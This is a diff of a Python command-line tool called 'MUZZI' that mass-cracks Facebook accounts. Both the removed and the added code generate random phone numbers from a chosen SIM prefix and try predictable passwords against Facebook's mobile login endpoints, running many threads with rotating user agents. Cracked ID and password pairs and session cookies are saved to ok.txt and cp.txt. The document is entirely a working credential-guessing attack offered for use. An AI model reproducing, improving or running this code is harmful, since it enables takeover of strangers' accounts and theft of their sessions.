@@ -182,329 +182,61 @@ __   __  __   __  _______  _______  __   __  __   __  ___   ___
 \033[1;37m[-] VERSION   :\033[1;32m 1.9
 \033[1;37m[-] STATUS    :\033[1;32m Paid
 --------------------------------------------------""")
-def linex():
-	print('\033[0;97m------------------------------------------------')
-loop = 0
-oks = []
-cps = []
-loop=0
-oks=[]
-cps=[]
-pcp=[]
-id=[]
-def fia():    
-			print(logo)
-			print('\033[1;32m>>> Legend :\x1b[1;97m  ')
-			linex()
-			print('[1] File Clone\n[2] Pakistan Random Cloning\n[3] Bangladesh Cloning\n[4] Email Cloning\n[0] Exit')
-			linex()
-			xd=input('[*] Choose an option: ')
-			if xd in ['1','01']:
-				os.system('clear')
-				print(logo)
-				print('Example : /sdcard/MUZZI.txt')
-				linex()
-				file = input(' Put file path\033[1;97m: ')
-				try:
-					fo = open(file,'r').read().splitlines()
-				except FileNotFoundError:
-					print(' File location not found ')
-					time.sleep(1)
-					menu()
-				os.system('clear')
-				print(logo)
-				
-				linex()
-				print('[1] Method 1 \n[2] Method 2 ')
-				linex()
-				mthd=input(' Choose: ')
-				linex()
-				plist = []
-				try:
-					ps_limit = int(input(' How many passwords do you want to add ? '))
-				except:
-					ps_limit =1
-				linex()
-				
-				linex()
-				for i in range(ps_limit):
-					plist.append(input(f' Put password {i+1}: '))
-				linex()
-				print('[1] Start Cloning')
-				linex()
-				cx=input(' Choose: ')
-				if cx in ['y','Y','yes','Yes','1']:
-					pcp.append('y')
-				else:
-					pcp.append('n')
-				with tred(max_workers=90) as crack_submit:
-					os.system('clear')
-					print(logo)
-					total_ids = str(len(fo))
-					
-					linex()
-					for user in fo:
-						ids,names = user.split('|')
-						passlist = plist
-						if mthd in ['1','01']:
-							crack_submit.submit(ffb,ids,names,passlist)
-						elif mthd in ['2','02']:
-							crack_submit.submit(mmm,ids,names,passlist)
-						else:
-							crack_submit.submit(api,ids,names,passlist)
-				print('\033[1;97m')
-				linex()
-				print(' The process has completed')
-				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-				linex()
-				input(' Press enter to back ')
-				os.system('python MUZZI.py')
-			elif xd in ['2','02']:
-				menu()
-			elif xd in ['3','03']:
-				bd()
-			elif xd in ['4','04']:
-				os.system(f'xdg-open https://www.facebook.com/profile.php?id=100089010637055');menu()
-			elif xd in ['0','00']:
-				exit()
-			else:
-				exit(' Option not found in menu...')
-		
-def mmm(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[0;92m[MUZZI] %s|\033[0;92mOK:-%s \033[0;97m'%(loop,len(cps)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			
-			session.headers.update({"Host":"x.facebook.com", "upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
-			getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			MUZZI=session.cookies.get_dict().keys()
-			if "c_user" in MUZZI:
-				print('\r\r\033[0;97m[MUZZI-CP] %s | %s'%(ids,pas))
-				
-				open('/sdcard/MUZZI-CP.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in MUZZI:
-				if 'y' in pcp:
-					print('\r\r\x1b[1;92m[MUZZI-OK] '+ids+' | '+pas+'\033[0;92m')
-					
-					open('/sdcard/MUZZI-OK.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-def ffb(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[0;92m[MUZZI] %s|\033[1;92mOK:-%s \033[0;92m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua = random.choice(ugen)
-			
-			head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			MUZZI=session.cookies.get_dict().keys()
-			if "c_user" in MUZZI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[0;92m[MUZZI-OK] %s | %s'%(ids,pas))
-				
-				open('/sdcard/MUZZI-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in MUZZI:
-				if 'y' in pcp:
-					print('\r\r\x1b[1;97m[MUZZI-CP] '+ids+' | '+pas+'\033[1;97m')
-					
-					open('/sdcard/MUZZI-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-def menu():
-	os.system('clear')
-	print(logo)
-	print('[1] Crack random Clone Method 1')
-	print('[2] Crack random Clone Method 2')
-	print('[3] Crack random Clone Method 3')
-	linex()
-	opt = input('[√] SELECT OPT: ')
-	if opt =='1':
-		random_number1()
-	elif opt =='2':
-		random_number2()
-	elif opt =='3':
-		random_number3()
-	
-	else:
-		print('\n\033[1;31mChoose valid option\033[0;97m')
-		menu()
-#____
-def random_number1():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	linex()
-	kode = input('[+]\033[0;92m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	limit = int(input('[+]How many numbers do you want to add ? '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[*] Total Acounts : '+tl)
-		print('[+] Ypur Select Code : '+kode)
-		print('\x1b[1;91m[*] If You No Result Use Flight Mode ')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode]
-			yaari.submit(fcrack,uid,pwx,tl)
-	print(47*"—") 
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	print(47*"—") 
-	input('Press Enter To Go Back To Menu')
-	fia()
-#____
-def random_number2():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	linex()
-	kode = input('[+]\033[0;92m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	limit = int(input('[+]How many numbers do you want to add ? '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[*] Total Acounts : '+tl)
-		print('[+] Ypur Select Code : '+kode)
-		print('\x1b[1;91m[*] If You No Result Use Flight Mode ')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = ['khan12','khan12345','khankhan123','khankhan','khan123456']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print(47*"-")
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in ok.txt,cp.txt')
-	print(47*"-")
-	input('Press Inter To Back Menu')
-	fia()
-#____________
+class Main:
+    def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        os.system("clear")
+        print(logo)
+        print(" [01] Random Number Clone")
+        print(" [02] Random Email Clone ")
+        print(" [00] Exit")
+        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        Mumit =input(" [?] Choose : ")
+        #os.system('xdg-open https://facebook.com/groups/termuxteambd/')
+        if Mumit in ["1", "01"]:
+            num()
+        if Mumit in ["2","02"]:
+            gml()
+        if Mumit in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+def num():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    kode = input(' [?] Enter sim code: ')
+    kodex = ''.join(random.choice(string.digits) for _ in range(2))
+    kod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
+    print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    limit = int(input(' [?] Crack Limit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print(' \033[1;32m[+] Total ids:\033[1;35m '+tl)
+        print(' \033[1;33m[+] Process has been started')
+        print(' \033[1;36m[!] Wait for ids ')
+        print(' \033[1;92m[!] Use flight mode for speed up ')
+        print("\033[1;97m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        for guru in user:
+            uid = kode+kodex+kod+guru
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
+            yaari.submit(rcrack1,uid,pwx,tl)
+    print(' [+] Crack process has been completed')
+    print(' [+] Ids saved in ok.txt,cp.txt')
 
-
-#_______
-def random_number3():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	linex()
-	kode = input('[+]\033[0;92m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	limit = int(input('[+]How many numbers do you want to add ? '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[*] Total Acounts : '+tl)
-		print('[+] Ypur Select Code : '+kode)
-		print('\x1b[1;91m[*] If You No Result Use Flight Mode ')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode+guru,'khankhan','khan1122','khan12','khan123','khan123456']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print(47*"-")
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in ok.txt,cp.txt')
-	print(47*"-")
-	input('Press Inter To Back Menu')
-	fia()
-#___________
-def bd():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE : 088***,88***,88****,88****,.ETC')
-	linex()
-	kode = input('[+]\033[0;92m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	limit = int(input('[+]How many numbers do you want to add ? '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[*] Total Acounts : '+tl)
-		print('[+] Ypur Select Code : '+kode)
-		print('\x1b[1;91m[*] If You No Result Use Flight Mode ')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode+guru,'+88','bangladish']
-			yaari.submit(fcrack,uid,pwx,tl)
-	print(47*"-")
-	print('[✓] Crack process has been completed')
-	print('[?] Ids saved in ok.txt,cp.txt')
-	print(47*"-")
-	input('Press Inter To Back Menu')
-	fia()
-	#___________
 def gml():
     user=[]
     os.system('clear')
@@ -541,69 +273,68 @@ def gml():
             yaari.submit(rcrack1,uid,pwx,tl)
     print(' [+] Crack process has been completed')
     print(' [+] Ids saved in ok.txt,cp.txt')
-#_____
-def fcrack(uid,pwx,tl):
-	#print(user)
-	global loop
-	global cps
-	global oks
-	global ugen
-	try:
-		for ps in pwx:
-			session = requests.Session()
-			sys.stdout.write(f'\r [\033[0;92mMUZZI\033[0;92m] %s|OK:-%s \r'%(loop,len(oks))),
-			sys.stdout.flush()
-			ua = random.choice(ugen)
-			free_fb = session.get('https://free.facebook.com').text
-			log_data = {
-				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-			"try_number":"0",
-			"unrecognized_tries":"0",
-			"email":uid,
-			"pass":ps,
-			"login":"Log In"}
-			header_freefb = {'authority': 'mabsic.facebook.com',
+def rcrack1(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r[\033[1;32mMUZI\033[1;92m] > [%s/%s] > [OK\033[1;96m:-\033[1;92m%s\033[1;35m] - [CP\033[1;32m:-\033[1;91m%s\033[1;33m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb ={'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=7cUHZT55wXX1t8sp0_YBjZFt; sb=7cUHZTHNBDM_O1Byoq_IlqIi; m_pixel_ratio=2; wd=360x676; fr=0TW7qD2i7wDszsLqA..BlB8Xt.ZQ.AAA.0.0.BlB8YD.AWWMJ7iBZBs',
     'dpr': '2',
     'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"TECNO LD7"',
+    'sec-ch-ua-model': '"RMX2101"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
-            'user-agent': ua}
-			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[151:166]
-				print('\x1b[1;92m[MUZZI-XD-OK] '+cid+' | '+ps+'\033[0;97m')
-				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
-				oks.append(cid)
-				break
-			elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[141:156]
-				print('\33[38;5;208m[MUZZI-XD-CP] '+cid+' | '+ps+'\033[0;92m')
-				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
-				cps.append(cid)
-				break
-			else:
-				continue
-		loop+=1
-	except:
-		pass
-    
-fia()
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"\033[38;5;46m[M4Z1-OK] {uid} | {ps}")
+                print(f" Cookie : {coki}")
+                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"\x1b[38;5;196m[M4Z1-CP] {cid}|{ps}")
+                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\033[m[MUZI] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+Main()
